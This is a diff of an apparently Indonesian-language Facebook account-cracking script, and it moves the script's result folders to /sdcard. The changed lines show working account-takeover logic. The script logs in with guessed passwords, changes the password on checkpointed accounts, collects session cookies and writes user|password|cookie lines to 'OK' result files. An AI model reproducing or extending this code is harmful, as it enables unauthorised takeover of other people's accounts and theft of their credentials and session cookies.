@@ -633,7 +633,7 @@ def result():
 	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",style=f"bold cyan"))
 	kz = input(f' [+] Pilih : ')
 	if kz in ['2','02']:
-		try:vin = os.listdir('CP')
+		try:vin = os.listdir('/sdcard/CP')
 		except FileNotFoundError:
 			print(' [+] File Tidak Di Temukan ')
 			time.sleep(3)
@@ -676,7 +676,7 @@ def result():
 			input('[ Klik Enter ]')
 			exit()
 	elif kz in ['1','01']:
-		try:vin = os.listdir('OK')
+		try:vin = os.listdir('/sdcard/OK')
 		except FileNotFoundError:
 			print(' [+] File Tidak Di Temukan ')
 			time.sleep(4)
@@ -1691,7 +1691,7 @@ pwBaru = []
 ubahP = []
 
 def file_cp():
-	dirs = os.listdir('CP')
+	dirs = os.listdir('/sdcard/CP')
 	prints(Panel(f"""Copy Nama File Hasil Crack Di Bawah Ini Kemudian Pastekan Di Bawah Untuk Cek Opsi""",width=90,style=f"bold white"))
 	for file in dirs:
 		prints(Panel(f"""{(file)}""",width=90,style=f"bold white"))
@@ -1703,7 +1703,7 @@ def file_cp():
 		exit()
 
 def opsi():
-	CP = ("CP/")
+	CP = ("/sdcard/CP/")
 	romi = console.input(f" [+] Tempelkan Pilihan : ")
 	if romi == "":
 		prints(Panel(f""" [+] Isi Yang Benar""",width=90,style=f"bold white"))
@@ -1787,13 +1787,13 @@ def mengecek(user,pw):
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
-						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
+						open('/sdcard/OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
 				else:
 					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
 					tree = Tree(" ",guide_style=f"{color_ok}")
 					tree.add(Panel(f"{ua}",width=83,padding=(0,2),style=f"{color_ok}"))
 					prints(tree)
-					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
+					open('/sdcard/OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
 				print("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M))
 			else:
@@ -1801,7 +1801,7 @@ def mengecek(user,pw):
 		else:
 			if "c_user" in session.cookies.get_dict():
 				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
-				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
+				open('/sdcard/OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
 			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
@@ -2517,9 +2517,9 @@ class sxp_wa:
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/OK')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/CP')
 	except:pass
 	try:os.mkdir('/sdcard/DUMP-FILE')
 	except:pass
